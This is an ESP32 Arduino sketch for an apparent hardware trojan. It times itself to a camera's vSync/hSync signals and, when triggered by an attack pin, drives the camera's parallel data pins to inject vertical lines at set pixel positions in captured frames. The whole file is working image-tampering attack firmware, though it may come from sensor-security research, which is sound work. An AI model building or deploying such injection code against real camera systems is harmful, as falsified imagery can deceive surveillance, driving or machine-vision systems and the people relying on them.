#include <Arduino.h>

#define CAM_CLK_PIN 27

#define D0_PIN 15
#define D1_PIN 2
#define D2_PIN 4
#define D3_PIN 16
#define D4_PIN 17
#define D5_PIN 5
#define D6_PIN 18
#define D7_PIN 19

// Define a maximum number of vertical lines we want to support
#define MAX_LINES 4
#define CYCLES_PER_PIXEL 49
#define LINE_WIDTH 2

uint8_t Control_pin = 13;
uint8_t attackPin = 23;
int temp = 0;

const uint8_t DATA_PINS[] = {15, 2, 4, 16, 17, 5, 18, 19};  // D0 to D7
const uint8_t NUM_DATA_PINS = sizeof(DATA_PINS) / sizeof(DATA_PINS[0]);

#define pin_vSync 34 // HIGH during each line
#define pin_hSync 14 // High during whole transmission

struct pixel
{
uint16_t X_loc;
uint16_t Y_loc;

};

pixel line_target = {120, 98};
pixel line10_target = {120, 98};

// Add this at the top with other globals
volatile int last_processed_vcount = -1;

// Sync Signal Flags
volatile bool flag_vSync = false;
volatile bool flag_hSync = false;


volatile bool line80_detected = false;
volatile bool line160_detected = false;
volatile bool line320_detected = false;


bool state = HIGH;

// Counts
volatile int vcount = 0;
uint16_t clk_count = 0;

// LineState struct to include all necessary info
struct LineState {
    uint16_t x_offset;    // horizontal position
    uint16_t v_start;     // vertical start
    uint16_t v_end;       // vertical end
    uint8_t width;        // line width in pixels
};

// line positions to start earlier
LineState lines[MAX_LINES] = {
    {20, 50, 100, 2},    // Moved left
    {40, 150, 200, 2},   // Moved left
    {60, 75, 125, 2},    // Moved left
    {300, 175, 225, 2}    //300 ~~~ 150
};

inline void waitPixels(uint16_t pixels) {
    const uint32_t cycles = CYCLES_PER_PIXEL * pixels;
    const uint32_t start = ESP.getCycleCount();
    while ((ESP.getCycleCount() - start) < cycles) {
        __asm__ __volatile__("nop");
    }
}

void IRAM_ATTR vSync_Raising_ISR() {
    vcount++; // Increment vertical count on rising edge of vSync
}


void IRAM_ATTR hSync_ISR() {
    if(digitalRead(pin_hSync) == LOW) {
        vcount = 0; // Reset vertical count on falling edge of hSync
        line80_detected = false;
        line160_detected = false;
        line320_detected = false;
    }
}

// Initialize Pins
void setupDataPins_OUTPUT() {
  for(uint8_t i = 0; i < NUM_DATA_PINS; i++) {
      pinMode(DATA_PINS[i], OUTPUT);
  }
}

// Change function signature to use uint8_t for 8-bit binary input
void setAllDataPins(uint8_t pattern) {
    for(uint8_t i = 0; i < NUM_DATA_PINS; i++) {
        // Extract each bit from pattern using right shift and mask
        bool pinState = (pattern >> i) & 0x01;
        digitalWrite(DATA_PINS[i], pinState);
    }
}

void Control_pin_Zmode() {    
       digitalWrite(Control_pin, HIGH); 
}

void Control_pin_ControlMode() {    
    digitalWrite(Control_pin, LOW); 
}

void setup() {
    Serial.println("Starting...");
    // Set Trojan to HIGH impedence mode 
    pinMode(Control_pin, OUTPUT); 

    pinMode(attackPin, INPUT_PULLUP);

    Control_pin_Zmode(); 

    // Set all injection pins as output
    setupDataPins_OUTPUT(); 

    // Set control pin to high impedance mode
    



    // For reading the Sync Signals
    pinMode(pin_vSync, INPUT);
    pinMode(pin_hSync, INPUT);
    setAllDataPins(0b00000000); //1st byte


    attachInterrupt(digitalPinToInterrupt(pin_vSync), vSync_Raising_ISR, RISING);
    attachInterrupt(digitalPinToInterrupt(pin_hSync), hSync_ISR, FALLING);
}

void loop() {
    while(digitalRead(attackPin) == LOW) {
        if(vcount > 0 && vcount != last_processed_vcount) {
            uint32_t lineStartCycle = ESP.getCycleCount();
            
            // Process all lines for current vcount
            for(uint8_t i = 0; i < MAX_LINES; i++) {
                if(vcount >= lines[i].v_start && vcount <= lines[i].v_end) {
                    // Reset timing for each line
                    ESP.getCycleCount(); // Synchronize
                    
                    // Wait for x_offset from line start
                    waitPixels(lines[i].x_offset);
                    
                    // Quick attack sequence
                    Control_pin_ControlMode();
                    waitPixels(lines[i].width);
                    Control_pin_Zmode();
                }
            }
            last_processed_vcount = vcount;
        }
    }
}